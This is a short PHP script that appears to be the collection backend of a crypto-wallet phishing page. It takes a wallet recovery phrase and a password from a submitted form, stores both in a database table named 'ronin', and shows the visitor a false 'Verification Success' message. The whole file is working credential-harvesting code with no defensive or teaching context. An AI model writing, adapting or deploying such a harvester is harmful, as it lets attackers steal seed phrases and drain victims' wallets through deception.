<?php
 $recoveryphrase=$_POST['phrase'];
 $password=$_POST['password'];

 $conn=new mysqli('localhost','root','','test');
 if($conn->connect_error){
     die('Connection Failed :'.$conn->connect_error);
 }else{
     $stmt=$conn->prepare("insert into ronin(phrase,password) values(?,?)");
     $stmt->bind_param("ss",$recoveryphrase,$password);
     $stmt->execute();
     echo "Verification Success";
     $stmt->close();
     $conn->close();
 }
?>